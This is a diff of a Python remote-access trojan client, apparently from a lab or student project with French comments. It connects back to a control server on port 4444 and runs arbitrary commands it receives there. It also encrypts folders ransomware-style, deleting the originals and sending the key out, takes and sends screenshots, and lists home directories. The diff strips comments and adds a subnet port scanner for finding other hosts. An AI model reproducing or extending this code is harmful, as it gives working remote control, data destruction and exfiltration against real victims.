@@ -1,9 +1,9 @@
 import socket
 import subprocess
 import os
-from cryptography.fernet import Fernet # <--- AJOUT 1
+from cryptography.fernet import Fernet
 
-SERVER_IP = "192.168.161.130" # À changer par l'IP du serveur si besoin
+SERVER_IP = "192.168.161.130"
 SERVER_PORT = 4444
 
 
@@ -30,14 +30,12 @@ def encrypt_folder(chemin):
         if not os.path.isdir(chemin):
             return f"Erreur: {chemin} n'est pas un dossier"
         
-        # On genere une nouvelle cle pour ce dossier
         clef = Fernet.generate_key()
         fernet = Fernet(clef)
         compteur = 0
         
         for racine, dossiers, fichiers in os.walk(chemin):
             for nom in fichiers:
-                # On evite de rechiffrer les fichiers deja chiffres
                 if nom.endswith('.enc'):
                     continue
                     
@@ -53,7 +51,7 @@ def encrypt_folder(chemin):
                     os.remove(filepath)
                     compteur += 1
                 except Exception:
-                    pass # On ignore les fichiers qu'on ne peut pas lire
+                    pass 
                     
         return f"{compteur} fichiers chiffres dans {chemin}\nCLEF:{clef.decode()}"
     except Exception as e:
@@ -66,7 +64,6 @@ def main():
         sock.connect((SERVER_IP, SERVER_PORT))
         local_ip = sock.getsockname()[0]
         
-        # Le handshake reste en clair pour que le serveur puisse lire l'IP et l'OS
         sock.send(f"{socket.gethostname()} - {local_ip} - Linux".encode())
         
     except Exception as e:
@@ -75,20 +72,16 @@ def main():
 
     while True:
         try:
-            # 1. On recoit les donnees brutes du serveur
             data_recue = sock.recv(4096)
             if not data_recue:
                 break
             
-            # 2. Cas special : la commande "exit" est envoyee en clair par le serveur
             if data_recue == b"exit":
                 break
             
-            # 3. On dechiffre la commande recue
             cmd = cipher.decrypt(data_recue).decode('utf-8').strip()
 
         except Exception as e:
-            # Si le serveur envoie une commande non chiffree, on evite de planter
             print(f"[-] Erreur de dechiffrement : {e}")
             continue 
 
@@ -102,28 +95,45 @@ def main():
         elif cmd == "list_home":
             resultat = execute_cmd("ls -laR /home")
             
-        
         elif cmd.startswith("encrypt "):
-            
             chemin = cmd.split(" ", 1)[1]
             resultat = encrypt_folder(chemin)
 
-        # --- La capture d'écran (Reste en clair car c'est du binaire) ---
+        
+        elif cmd.startswith("scan "):
+            cible = cmd.split(" ")[1]
+            base_ip = ".".join(cible.split(".")[:3]) + "."
+            
+            ports_ouverts = []
+            # On scanne les 20 premieres IP du reseau sur des ports classiques
+            for i in range(1, 255):
+                ip = base_ip + str(i)
+                for port in [21, 22, 80, 443, 3389]:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(0.05) # Timeout court pour aller vite
+                    if s.connect_ex((ip, port)) == 0:
+                        ports_ouverts.append(f"{ip}:{port}")
+                    s.close()
+            
+            if ports_ouverts:
+                resultat = "Services trouves:\n" + "\n".join(ports_ouverts)
+            else:
+                resultat = "Aucun service trouve sur la plage."
+        
+
         elif cmd == "screenshot":
             os.system("scrot /tmp/screen.png")
             try:
                 with open("/tmp/screen.png", "rb") as f:
-                    sock.send(f.read()) # On envoie les bytes bruts
+                    sock.send(f.read())
             except FileNotFoundError:
                 err_msg = cipher.encrypt(b"Erreur: capture impossible (pas d'ecran)")
                 sock.send(err_msg)
-            continue  # 
+            continue  
             
-        # --- Commandes normales ---
         else:
             resultat = execute_cmd(cmd)
 
-        # 4. On chiffre le resultat avant de l'envoyer sur le reseau
         try:
             resultat_encrypted = cipher.encrypt(resultat.encode())
             sock.send(resultat_encrypted)
